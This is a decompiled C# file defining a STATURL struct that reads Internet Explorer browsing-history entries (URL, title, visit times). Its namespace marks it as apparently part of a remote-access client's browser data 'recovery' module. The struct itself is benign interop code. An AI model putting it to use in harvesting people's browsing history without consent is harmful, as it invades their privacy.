using System;
using System.Runtime.InteropServices;
using System.Runtime.InteropServices.ComTypes;

namespace xClient.Core.Recovery.Browsers
{
	// Token: 0x020000CB RID: 203
	public struct STATURL
	{
		// Token: 0x170000EB RID: 235
		// (get) Token: 0x0600051D RID: 1309 RVA: 0x000047E1 File Offset: 0x000029E1
		public string URL
		{
			get
			{
				return this.pwcsUrl;
			}
		}

		// Token: 0x170000EC RID: 236
		// (get) Token: 0x0600051E RID: 1310 RVA: 0x00012970 File Offset: 0x00010B70
		public string UrlString
		{
			get
			{
				int num = this.pwcsUrl.IndexOf('?');
				if (num >= 0)
				{
					return this.pwcsUrl.Substring(0, num);
				}
				return this.pwcsUrl;
			}
		}

		// Token: 0x170000ED RID: 237
		// (get) Token: 0x0600051F RID: 1311 RVA: 0x000047E9 File Offset: 0x000029E9
		public string Title
		{
			get
			{
				if (this.pwcsUrl.StartsWith("file:"))
				{
					return Win32api.CannonializeURL(this.pwcsUrl, Win32api.shlwapi_URL.URL_UNESCAPE).Substring(8).Replace('/', '\\');
				}
				return this.pwcsTitle;
			}
		}

		// Token: 0x170000EE RID: 238
		// (get) Token: 0x06000520 RID: 1312 RVA: 0x000129A4 File Offset: 0x00010BA4
		public DateTime LastVisited
		{
			get
			{
				return Win32api.FileTimeToDateTime(this.ftLastVisited).ToLocalTime();
			}
		}

		// Token: 0x170000EF RID: 239
		// (get) Token: 0x06000521 RID: 1313 RVA: 0x000129C4 File Offset: 0x00010BC4
		public DateTime LastUpdated
		{
			get
			{
				return Win32api.FileTimeToDateTime(this.ftLastUpdated).ToLocalTime();
			}
		}

		// Token: 0x170000F0 RID: 240
		// (get) Token: 0x06000522 RID: 1314 RVA: 0x000129E4 File Offset: 0x00010BE4
		public DateTime Expires
		{
			get
			{
				DateTime result;
				try
				{
					result = Win32api.FileTimeToDateTime(this.ftExpires).ToLocalTime();
				}
				catch (Exception)
				{
					result = DateTime.Now;
				}
				return result;
			}
		}

		// Token: 0x06000523 RID: 1315 RVA: 0x000047E1 File Offset: 0x000029E1
		public override string ToString()
		{
			return this.pwcsUrl;
		}

		// Token: 0x0400026F RID: 623
		public int cbSize;

		// Token: 0x04000270 RID: 624
		[MarshalAs(UnmanagedType.LPWStr)]
		public string pwcsUrl;

		// Token: 0x04000271 RID: 625
		[MarshalAs(UnmanagedType.LPWStr)]
		public string pwcsTitle;

		// Token: 0x04000272 RID: 626
		public System.Runtime.InteropServices.ComTypes.FILETIME ftLastVisited;

		// Token: 0x04000273 RID: 627
		public System.Runtime.InteropServices.ComTypes.FILETIME ftLastUpdated;

		// Token: 0x04000274 RID: 628
		public System.Runtime.InteropServices.ComTypes.FILETIME ftExpires;

		// Token: 0x04000275 RID: 629
		public STATURLFLAGS dwFlags;
	}
}
